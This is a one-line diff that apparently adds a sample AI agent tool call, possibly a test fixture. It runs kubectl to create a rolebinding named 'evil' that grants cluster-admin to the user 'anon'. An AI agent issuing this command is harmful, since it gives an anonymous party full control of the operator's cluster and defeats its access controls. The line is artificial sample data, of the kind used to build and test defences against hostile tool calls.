@@ -1,0 +1,1 @@
+{"name":"kubectl","input":{"command":"create rolebinding evil --clusterrole=cluster-admin --user=anon"}}
